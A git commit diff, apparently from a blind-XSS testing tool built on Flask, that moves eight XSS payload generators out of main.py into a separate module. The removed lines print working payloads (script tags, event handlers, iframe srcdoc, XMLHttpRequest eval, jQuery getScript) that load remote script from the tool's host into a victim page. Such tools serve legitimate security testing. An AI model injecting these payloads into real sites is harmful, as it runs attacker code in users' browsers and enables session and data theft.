3345e25e54a6d03d248f127323e633e042edbb35
Melis_34 <Jeremymelis@hotmail.com>
2024-12-05 14:30:35 +0100

    REFACTOR xss payloads
    Refactor de verschillende XSS-Payloads naar een apparte .py file om leesbaarheid te verbeteren

--- main.py
+++ main.py
@@ -2,6 +2,7 @@ import requests
 import os
 from flask import Flask, render_template, send_from_directory, request
 from models.vulnerability import Vulnerability
+from payload import payloads
 
 app = Flask(__name__)
 
@@ -27,75 +28,12 @@ def dashboard():
     return render_template('dashboard-view.html')
 
 # Functions for XSS payloads
-def basic_script():
-    return f'<script src="{request.current_host}"></script>'
 
-def javascript_uri():
-    return f"javascript:eval('document.createElement(\"script\").src=\"{request.current_host}\"')"
-
-def input_onfocus():
-    return f"<input onfocus='document.createElement(\"script\").src=\"{request.current_host}\";'>"
-
-def image_onerror():
-    return f"<img src='x' onerror='document.createElement(\"script\").src=\"{request.current_host}\";'>"
-
-def video_source():
-    return f"<video><source onerror='document.createElement(\"script\").src=\"{request.current_host}\"'></video>"
-
-def iframe_srcdoc():
-    return f"<iframe srcdoc='<script src=\"{request.current_host}\"></script>'></iframe>"
-
-def xmlhttprequest_load():
-    return f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{request.current_host}");a.send();</script>'
-
-def jquery_chainload():
-    return f'<script>$.getScript("{request.current_host}");</script>'
 
 # Define the route for the payloads page
 @app.route('/payloads')
 def index():
-    payloads = [
-        {
-            'func': basic_script,
-            'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
-            'description': 'Classic payload',
-        },
-        {
-            'func': javascript_uri,
-            'title': '<code>javascript:</code> URI Payload',
-            'description': 'Link-based XSS',
-        },
-        {
-            'func': input_onfocus,
-            'title': '<code>&lt;input&gt;</code> Tag Payload',
-            'description': 'HTML5 input-based payload',
-        },
-        {
-            'func': image_onerror,
-            'title': '<code>&lt;img&gt;</code> Tag Payload',
-            'description': 'Image-based payload',
-        },
-        {
-            'func': video_source,
-            'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
-            'description': 'Video-based payload',
-        },
-        {
-            'func': iframe_srcdoc,
-            'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
-            'description': 'iframe-based payload',
-        },
-        {
-            'func': xmlhttprequest_load,
-            'title': 'XMLHttpRequest Payload',
-            'description': 'Inline execution chainload payload',
-        },
-        {
-            'func': jquery_chainload,
-            'title': '<code>$.getScript()</code> (jQuery) Payload',
-            'description': 'Chainload payload for sites with jQuery',
-        },
-    ]
+    
     return render_template('payloads-view.jinja', payloads=payloads)
 
 @app.route("/results")
